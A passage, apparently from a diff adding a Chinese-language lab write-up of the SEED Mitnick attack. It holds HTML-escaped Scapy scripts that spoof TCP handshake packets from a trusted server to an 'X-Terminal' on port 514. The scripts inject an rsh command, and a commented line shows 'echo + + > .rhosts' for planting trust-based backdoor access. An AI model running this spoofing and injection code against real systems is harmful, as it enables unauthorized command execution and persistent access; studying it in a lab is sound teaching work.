+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;IP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;srv_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                 &lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sport&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;srv_port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                 &lt;span class=&#34;n&#34;&gt;dport&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x_port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                 &lt;span class=&#34;n&#34;&gt;seq&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;syn_seq&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                 &lt;span class=&#34;n&#34;&gt;ack&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;seq&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                 &lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;  &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; Spoofing ACK&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;c1&#34;&gt;# Send rsh command to X-Terminal&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;PA&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;srv_port2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;seed&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;seed&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;touch /tmp/mitnick&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;c1&#34;&gt;#data = str(srv_port2) + &amp;#39;\x00seed\x00seed\x00echo + + &amp;gt; .rhosts\x00&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;      Sending data: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;c1&#34;&gt;# Reset the connection after 2 seconds&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;c1&#34;&gt;# This is not necessary. We did this, so we can repeat the attack.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;R&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;seq&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;syn_seq&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;  &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; Resetting connection&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;tcp and src host &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; and src port &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; and dst host &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; and dst port &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;myFilter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x_port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;srv_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;srv_port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sniff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iface&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;br-302e4ba285b3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;myFilter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;spoof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;终端 2 运行 &lt;code&gt;spoof_syn_ack_2nd.py&lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; volumes
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 spoof_syn_ack_2nd.py
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这个脚本用于处理 X-Terminal 产生的第二个反向连接握手&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;scapy.all&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;x_ip&lt;/span&gt;      &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.9.0.5&amp;#34;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# X-Terminal&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;srv_ip&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.9.0.6&amp;#34;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# The trusted server&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;x_port&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;514&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;# Port number used by X-Terminal&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;srv_port&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1023&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# Port number used by the trusted server&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;srv_port2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9090&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# Port number used by the 2nd connection&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;syn_seq&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;# Initial sequence number &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Spoof the SYN+ACK to finish the 2nd connection intiated by X-Terminal&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Only allowed to use the sequence number &amp;amp; src port in captured packet&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;spoof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# Spoof a SYN+ACK reply after receiving a SYN packet&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pkt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;S&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;  &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;--&amp;gt;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; Spoofing SYN+ACK.&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;old_tcp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sport&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;c1&#34;&gt;####################################################&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;ip&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IP&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;   &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;srv_ip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
